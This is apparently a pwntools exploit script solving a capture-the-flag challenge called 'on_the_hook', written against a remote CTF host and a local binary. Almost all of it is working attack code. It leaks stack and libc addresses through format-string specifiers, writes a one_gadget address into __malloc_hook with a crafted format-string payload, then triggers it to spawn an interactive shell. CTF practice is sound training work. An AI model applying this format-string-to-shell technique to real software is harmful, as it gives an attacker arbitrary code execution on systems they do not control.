from pwn import *

context(os='linux', arch='i386')
context.log_level = 'debug'

BINARY = './on_the_hook'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "ctf.k3rn3l4rmy.com"
  PORT = 2201
  s = remote(HOST, PORT)
  libc = ELF("./libc.so.6"); 
  one_gadget_offset = [0x3ac5c, 0x3ac5e, 0x3ac62, 0x3ac69, 0x5fbc5, 0x5fbc6]
else:
  s = process(BINARY)
  libc = elf.libc
  one_gadget_offset = [0x3ac6c, 0x3ac6e, 0x3ac72, 0x3ac79, 0x5fbd5, 0x5fbd6]
  #s = process(BINARY, env={'LD_PRELOAD': './libc.so.6'})
  #libc = ELF("./libc.so.6")
  #one_gadget_offset = [0x3ac5c, 0x3ac5e, 0x3ac62, 0x3ac69, 0x5fbc5, 0x5fbc6]

index = 7

# Lead stack address
s.sendline("%21$p")
s.recvuntil("echo:\n")
stack_leak  = int(s.recvuntil('\n'), 16)
target_addr = stack_leak - 0x118
print("stack_leak  =", hex(stack_leak))
print("target_addr =", hex(target_addr))

# Leak libc address
s.sendline(p32(elf.got.setvbuf) + b"%7$s")
s.recv(4)
setvbuf     = u32(s.recv(4))
libc_base   = setvbuf - libc.sym.setvbuf
malloc_hook = libc_base + libc.sym.__malloc_hook
one_gadget  = libc_base + one_gadget_offset[2]

print("setvbuf     =", hex(setvbuf))
print("libc_base   =", hex(libc_base))

# Write One-gadget in __malloc_hook
writes = {malloc_hook: one_gadget}
buf = fmtstr_payload(index, writes, write_size='short')
s.sendline(buf)

# Start One_gadget
s.sendline("%100000c")

s.interactive()

